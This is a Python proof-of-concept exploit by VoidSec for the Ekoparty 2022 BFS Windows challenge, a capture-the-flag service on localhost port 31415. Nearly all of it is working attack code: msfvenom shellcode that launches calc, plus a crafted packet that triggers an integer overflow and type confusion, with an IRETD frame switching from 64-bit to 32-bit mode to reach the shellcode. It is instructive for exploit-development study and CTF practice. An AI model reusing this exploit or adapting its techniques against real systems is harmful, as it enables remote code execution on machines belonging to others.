import socket
import struct

"""
Exploit title:      Ekoparty 2022 BFS Windows Challenge
Exploit Authors:    Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Grade:              PoC
Date:               20/11/2022
Tested on:          Windows 10 Pro x64 22H2 Build 19045.2251
Category:           remote exploit
Platform:           windows
"""

# msfvenom -a x64 --platform Windows -p windows/x64/exec cmd="calc" -f python -v shellcode
shellcode_x64 = b""
# shellcode_x64 += b"\xcc"  # INT3
shellcode_x64 += b"\xea\x1c\x00\x00\x10\x33\x00"  # 32-bit shellcode prologue restoring the CS value to 0x33 - JMP 0x33:0x1000001c
shellcode_x64 += b"\x48\x89\xCC"  # 64-bit shellcode prologue restoring old stack pointer - MOV RSP, RCX
# shellcode_x64 += b"\xcc"  # INT3
shellcode_x64 += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00"
shellcode_x64 += b"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2"
shellcode_x64 += b"\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
shellcode_x64 += b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7"
shellcode_x64 += b"\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c"
shellcode_x64 += b"\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
shellcode_x64 += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
shellcode_x64 += b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88"
shellcode_x64 += b"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
shellcode_x64 += b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
shellcode_x64 += b"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
shellcode_x64 += b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
shellcode_x64 += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
shellcode_x64 += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
shellcode_x64 += b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
shellcode_x64 += b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
shellcode_x64 += b"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
shellcode_x64 += b"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
shellcode_x64 += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0"
shellcode_x64 += b"\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff"
shellcode_x64 += b"\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
shellcode_x64 += b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00"
shellcode_x64 += b"\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0"
shellcode_x64 += b"\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
shellcode_x64 += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
shellcode_x64 += b"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
shellcode_x64 += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
shellcode_x64 += b"\x63\x00"

print("Ekoparty 2022 - BFS' Windows Challenge")
print("> Exploit by VoidSec")
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("127.0.0.1", 31415))

handshake = b"Hello\x00"
print(f"[>] Sending handshake - {len(handshake)} bytes")
client.send(handshake)
resp = client.recv(3)
if resp == b"Hi\x00":
    print("[+] ACK")

    # Packet's Header
    header = b""
    header += b"Eko2022\x00"  # cookie
    header += b"T"  # packet type
    header += b"\xFF\xFF"  # packet size; leads to integer overflow
    print(f"Header size: {len(header)} bytes")

    # Packet's Data
    packet_data_size = 3840  # 0xF00
    packet_data = b""

    # IRETD STACK; switch from x64 to x32
    packet_data += struct.pack("<I", 0x10000014)  # EIP; start of our heap buffer + offset to land into our shellcode
    packet_data += struct.pack("<I", 0x23)  # CS; selector for user mode
    packet_data += struct.pack("<I", 0x246)  # EFLAGS; taken from WindDbg
    packet_data += struct.pack("<I", 0x10000800)  # ESP; a "safe" place in the "middle" of our heap buffer
    packet_data += struct.pack("<I", 0x53)  # SS; a value I've found while debugging. It is of type Data RW
    print(f"IRETD STACK size: {len(packet_data)} bytes")

    # SHELLCODE
    packet_data += shellcode_x64
    print(f"Shellcode size: {len(shellcode_x64)} bytes")

    packet_data += b"A" * (packet_data_size - len(packet_data))  # fill the buffer up to where we overwrite packet_type
    packet_data += b"X"  # type confusion
    packet_data += b"X" * 7  # disassembled into 'pop rax' as we must not "trash" the stack
    # print(packet_data)
    print(f"[>] Sending packet: {len(header + packet_data)} bytes")
    client.send(header + packet_data)
    resp = client.recv(20)
    if resp == b"Unsupported message\x00":
        print("[+] Type Confusion Triggered")
    else:
        print("[!] Type Confusion Error")
else:
    print("[!] Handshake Error")
client.close()
